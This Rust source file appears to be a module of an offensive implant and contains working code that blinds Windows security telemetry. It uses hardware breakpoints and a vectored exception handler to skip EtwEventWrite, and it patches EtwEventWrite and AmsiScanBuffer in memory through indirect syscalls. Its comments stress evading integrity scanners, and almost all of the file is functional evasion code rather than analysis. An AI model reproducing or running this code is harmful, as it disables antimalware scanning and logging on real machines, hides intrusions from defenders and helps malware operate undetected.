#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Telemetry Blinding (ETW & AMSI) - Enhanced
//!
//! Disables Windows telemetry and antimalware scanning.
//!
//! ## Improvements over Original
//! - **Hardware Breakpoints**: No memory modification for ETW (invisible to integrity scanners)
//! - **VEH Handler**: Intercepts execution at EtwEventWrite and skips it
//! - **Zero Footprint**: Dr0-Dr3 registers only; no byte changes in ntdll
//! - **Fallback**: AMSI still uses patching (less monitored than ETW)
//!
//! ## How Hardware Breakpoints Work
//! 1. Set Dr0 register to EtwEventWrite address
//! 2. Configure Dr7 to enable breakpoint on execution
//! 3. VEH catches EXCEPTION_SINGLE_STEP
//! 4. Handler sets RAX=0 (success) and RIP to skip function
//! 5. No bytes modified = invisible to memory integrity checks

use crate::stealth::windows::syscalls::{self, Syscall};
use crate::stealth::windows::stack_spoof;
use std::ffi::c_void;
use std::ptr;
use std::sync::atomic::{AtomicPtr, AtomicBool, Ordering};
use log::{info, error, debug, warn};

// ============================================================================
// CONSTANTS
// ============================================================================

const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
const CONTEXT_DEBUG_REGISTERS: u32 = 0x00010010;
const CONTEXT_CONTROL: u32 = 0x00010001;
const CONTEXT_INTEGER: u32 = 0x00010002;
const CONTEXT_FULL: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER | 0x00010008;

// DR7 bit flags
const DR7_L0: u64 = 1 << 0;  // Local enable for Dr0
const DR7_G0: u64 = 1 << 1;  // Global enable for Dr0
const DR7_L1: u64 = 1 << 2;  // Local enable for Dr1
const DR7_COND_EXEC: u64 = 0b00 << 16; // Break on execution

// ============================================================================
// GLOBAL STATE
// ============================================================================

static ETW_ADDRESS: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static AMSI_ADDRESS: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static VEH_INSTALLED: AtomicBool = AtomicBool::new(false);

// ============================================================================
// CONTEXT STRUCTURE (x64) - Verified against Windows SDK winnt.h
// ============================================================================

/// Windows CONTEXT structure for x64
/// Total size: ~1232 bytes, 16-byte aligned
#[repr(C, align(16))]
struct CONTEXT {
    // Home space for register parameters (0x00-0x30)
    p1_home: u64,  // 0x00
    p2_home: u64,  // 0x08
    p3_home: u64,  // 0x10
    p4_home: u64,  // 0x18
    p5_home: u64,  // 0x20
    p6_home: u64,  // 0x28
    
    // Context flags and MxCsr (0x30-0x38)
    context_flags: u32,  // 0x30
    mx_csr: u32,         // 0x34
    
    // Segment registers (0x38-0x44)
    seg_cs: u16,  // 0x38
    seg_ds: u16,  // 0x3A
    seg_es: u16,  // 0x3C
    seg_fs: u16,  // 0x3E
    seg_gs: u16,  // 0x40
    seg_ss: u16,  // 0x42
    
    // EFLAGS (0x44-0x48)
    e_flags: u32,  // 0x44
    
    // Debug registers (0x48-0x78) - CORRECT, immediately after e_flags!
    dr0: u64,  // 0x48
    dr1: u64,  // 0x50
    dr2: u64,  // 0x58
    dr3: u64,  // 0x60
    dr6: u64,  // 0x68
    dr7: u64,  // 0x70
    
    // General purpose registers (0x78-0xF8)
    rax: u64,  // 0x78
    rcx: u64,  // 0x80
    rdx: u64,  // 0x88
    rbx: u64,  // 0x90
    rsp: u64,  // 0x98
    rbp: u64,  // 0xA0
    rsi: u64,  // 0xA8
    rdi: u64,  // 0xB0
    r8: u64,   // 0xB8
    r9: u64,   // 0xC0
    r10: u64,  // 0xC8
    r11: u64,  // 0xD0
    r12: u64,  // 0xD8
    r13: u64,  // 0xE0
    r14: u64,  // 0xE8
    r15: u64,  // 0xF0
    
    // RIP (0xF8)
    rip: u64,  // 0xF8
    
    // FPU/XMM state (0x100+)
    _fpu_xmm_state: [u8; 512],
}

#[repr(C)]
struct EXCEPTION_RECORD {
    exception_code: u32,
    exception_flags: u32,
    exception_record: *mut EXCEPTION_RECORD,
    exception_address: *mut c_void,
    number_parameters: u32,
    exception_information: [usize; 15],
}

#[repr(C)]
struct EXCEPTION_POINTERS {
    exception_record: *mut EXCEPTION_RECORD,
    context_record: *mut CONTEXT,
}

// ============================================================================
// VEH HANDLER
// ============================================================================

/// Vectored Exception Handler for hardware breakpoints
unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
    
    let info = &*exception_info;
    let record = &*info.exception_record;
    let ctx = &mut *info.context_record;
    
    // Only handle single-step exceptions (hardware breakpoint hit)
    if record.exception_code != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    let exc_addr = record.exception_address;
    let etw_addr = ETW_ADDRESS.load(Ordering::Relaxed);
    let amsi_addr = AMSI_ADDRESS.load(Ordering::Relaxed);
    
    // Check if we hit EtwEventWrite
    if !etw_addr.is_null() && exc_addr == etw_addr {
        debug!("[VEH] Intercepted EtwEventWrite @ {:p}", exc_addr);
        
        // Set return value to 0 (STATUS_SUCCESS)
        ctx.rax = 0;
        
        // Skip the function by returning immediately
        // Read return address from stack and set RIP
        let return_addr = *(ctx.rsp as *const u64);
        ctx.rip = return_addr;
        ctx.rsp += 8; // Pop return address
        
        // Clear Dr6 (debug status) to prevent re-triggering
        ctx.dr6 = 0;
        
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    // Check if we hit AmsiScanBuffer (if using hardware BP for AMSI too)
    if !amsi_addr.is_null() && exc_addr == amsi_addr {
        debug!("[VEH] Intercepted AmsiScanBuffer @ {:p}", exc_addr);
        
        // Return E_INVALIDARG (0x80070057) to indicate scan failure
        ctx.rax = 0x80070057;
        
        let return_addr = *(ctx.rsp as *const u64);
        ctx.rip = return_addr;
        ctx.rsp += 8;
        ctx.dr6 = 0;
        
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    EXCEPTION_CONTINUE_SEARCH
}

// ============================================================================
// HARDWARE BREAKPOINT SETUP
// ============================================================================

type FnRtlAddVectoredExceptionHandler = unsafe extern "system" fn(
    first: u32, handler: unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32
) -> *mut c_void;

type FnNtGetContextThread = unsafe extern "system" fn(
    thread: isize, context: *mut CONTEXT
) -> i32;

type FnNtSetContextThread = unsafe extern "system" fn(
    thread: isize, context: *const CONTEXT
) -> i32;

/// Set hardware breakpoint on a target address using debug registers
unsafe fn set_hardware_breakpoint(target: *mut c_void, dr_index: u8) -> Result<(), String> {
    let ntdll = stack_spoof::get_ntdll_base()
        .ok_or("Failed to get ntdll base")?;
    
    let fn_get_ctx: FnNtGetContextThread = std::mem::transmute(
        stack_spoof::get_export_address(ntdll, b"NtGetContextThread\0")
            .ok_or("Failed to resolve NtGetContextThread")?
    );
    let fn_set_ctx: FnNtSetContextThread = std::mem::transmute(
        stack_spoof::get_export_address(ntdll, b"NtSetContextThread\0")
            .ok_or("Failed to resolve NtSetContextThread")?
    );
    
    // Get current thread handle (-2 = current thread)
    let current_thread: isize = -2;
    
    // Allocate aligned CONTEXT
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.context_flags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL;
    
    // Get current context
    let status = fn_get_ctx(current_thread, &mut ctx);
    if status != 0 {
        return Err(format!("NtGetContextThread failed: 0x{:X}", status));
    }
    
    // Set the appropriate debug register
    match dr_index {
        0 => ctx.dr0 = target as u64,
        1 => ctx.dr1 = target as u64,
        2 => ctx.dr2 = target as u64,
        3 => ctx.dr3 = target as u64,
        _ => return Err("Invalid DR index".into()),
    }
    
    // Configure DR7: enable local breakpoint, execution-only
    let enable_bit = 1u64 << (dr_index * 2); // L0, L1, L2, or L3
    ctx.dr7 |= enable_bit;
    // Set condition to execution (00) for this breakpoint
    // Bits 16-17 for Dr0, 20-21 for Dr1, etc.
    let cond_shift = 16 + (dr_index as u64 * 4);
    ctx.dr7 &= !(0b11 << cond_shift); // Clear condition bits (00 = execute)
    // Set length to 0 (1 byte) - required for execution breakpoints
    let len_shift = 18 + (dr_index as u64 * 4);
    ctx.dr7 &= !(0b11 << len_shift); // 00 = 1 byte
    
    // Set context with updated debug registers
    let status = fn_set_ctx(current_thread, &ctx);
    if status != 0 {
        return Err(format!("NtSetContextThread failed: 0x{:X}", status));
    }
    
    debug!("[HwBP] Hardware breakpoint {} set @ {:p}", dr_index, target);
    Ok(())
}

/// Install the VEH handler
unsafe fn install_veh_handler() -> Result<(), String> {
    if VEH_INSTALLED.load(Ordering::Relaxed) {
        return Ok(());
    }
    
    let ntdll = stack_spoof::get_ntdll_base()
        .ok_or("Failed to get ntdll base")?;
    
    let fn_add_veh: FnRtlAddVectoredExceptionHandler = std::mem::transmute(
        stack_spoof::get_export_address(ntdll, b"RtlAddVectoredExceptionHandler\0")
            .ok_or("Failed to resolve RtlAddVectoredExceptionHandler")?
    );
    
    // Add as first handler (priority 1)
    let handler = fn_add_veh(1, veh_handler);
    if handler.is_null() {
        return Err("RtlAddVectoredExceptionHandler failed".into());
    }
    
    VEH_INSTALLED.store(true, Ordering::Relaxed);
    debug!("[HwBP] VEH handler installed");
    Ok(())
}

// ============================================================================
// PUBLIC API
// ============================================================================

/// Apply all telemetry blinding using hardware breakpoints
pub fn apply_all_blinding() {
    info!("[Blinding] Applying enhanced telemetry blinders (Hardware Breakpoints)...");
    
    // Blind ETW using hardware breakpoints (zero memory modification!)
    if let Err(e) = blind_etw_hardware() {
        error!("[Blinding] ETW hardware blinding failed: {}", e);
        // Fallback to patching
        warn!("[Blinding] Falling back to memory patching for ETW");
        if let Err(e2) = patch_etw_fallback() {
            error!("[Blinding] ETW fallback patch also failed: {}", e2);
        }
    } else {
        info!("[Blinding] ETW blinded via Hardware Breakpoint (INVISIBLE to integrity scanners)");
    }

    // AMSI patching (less monitored, so patching is acceptable)
    if let Err(e) = patch_amsi() {
        debug!("[Blinding] AMSI patch skipped/failed: {}", e);
    } else {
        info!("[Blinding] AMSI patched (Script Scanning Disabled)");
    }
}

/// Blind ETW using hardware breakpoints + VEH
fn blind_etw_hardware() -> Result<(), String> {
    unsafe {
        // Install VEH first
        install_veh_handler()?;
        
        // Find EtwEventWrite
        let ntdll = stack_spoof::get_ntdll_base()
            .ok_or("Failed to find ntdll.dll")?;
        
        let etw_event_write = stack_spoof::get_export_address(ntdll, b"EtwEventWrite\0")
            .ok_or("Failed to find EtwEventWrite")?;
        
        debug!("[Blinding] EtwEventWrite at {:p}", etw_event_write);
        
        // Store address for VEH handler
        ETW_ADDRESS.store(etw_event_write as *mut c_void, Ordering::Relaxed);
        
        // Set hardware breakpoint on Dr0
        set_hardware_breakpoint(etw_event_write as *mut c_void, 0)?;
        
        Ok(())
    }
}

/// Fallback: Patch ETW using memory modification (if hardware BP fails)
fn patch_etw_fallback() -> Result<(), String> {
    unsafe {
        let ntdll = stack_spoof::get_ntdll_base()
            .ok_or("Failed to find ntdll.dll")?;
        
        let etw = stack_spoof::get_export_address(ntdll, b"EtwEventWrite\0")
            .ok_or("Failed to find EtwEventWrite")?;
        
        // x64: xor rax, rax; ret
        let payload = [0x48u8, 0x31, 0xC0, 0xC3];
        write_protected_memory(etw as *mut c_void, &payload)
    }
}

/// Patch AMSI using memory modification
fn patch_amsi() -> Result<(), String> {
    unsafe {
        // Only patch if amsi.dll is loaded
        let amsi = stack_spoof::get_kernel32_base()
            .and_then(|_| {
                // Look for amsi in loaded modules - simplified check
                None::<*const c_void>
            });
        
        if amsi.is_none() {
            // Try via GetModuleHandle fallback
            use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
            let handle = GetModuleHandleA(b"amsi.dll\0".as_ptr());
            if handle == 0 {
                return Err("amsi.dll not loaded".into());
            }
            
            use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
            let func = GetProcAddress(handle, b"AmsiScanBuffer\0".as_ptr());
            if func.is_none() {
                return Err("AmsiScanBuffer not found".into());
            }
            
            // mov eax, 0x80070057; ret
            let payload = [0xB8u8, 0x57, 0x00, 0x07, 0x80, 0xC3];
            return write_protected_memory(func.unwrap() as *mut c_void, &payload);
        }
        
        Err("amsi.dll not loaded".into())
    }
}

// ============================================================================
// MEMORY WRITING (Indirect Syscalls) - Fallback
// ============================================================================

unsafe fn write_protected_memory(target: *mut c_void, data: &[u8]) -> Result<(), String> {
    let sc_protect = Syscall::resolve(syscalls::HASH_NT_PROTECT_VIRTUAL_MEMORY)
        .ok_or("Failed to resolve NtProtectVirtualMemory")?;

    let mut base_addr = target;
    let mut region_size = data.len();
    let mut old_protect: u32 = 0;

    let status = syscalls::syscall(&sc_protect, &[
        -1 as isize as usize,
        &mut base_addr as *mut _ as usize,
        &mut region_size as *mut _ as usize,
        PAGE_EXECUTE_READWRITE as usize,
        &mut old_protect as *mut _ as usize,
    ]);

    if status != 0 {
        return Err(format!("NtProtect (RWX) failed: 0x{:X}", status));
    }

    ptr::copy_nonoverlapping(data.as_ptr(), target as *mut u8, data.len());

    let mut region_size = data.len();
    let mut temp_old: u32 = 0;
    let _ = syscalls::syscall(&sc_protect, &[
        -1 as isize as usize,
        &mut base_addr as *mut _ as usize,
        &mut region_size as *mut _ as usize,
        old_protect as usize,
        &mut temp_old as *mut _ as usize,
    ]);

    Ok(())
}

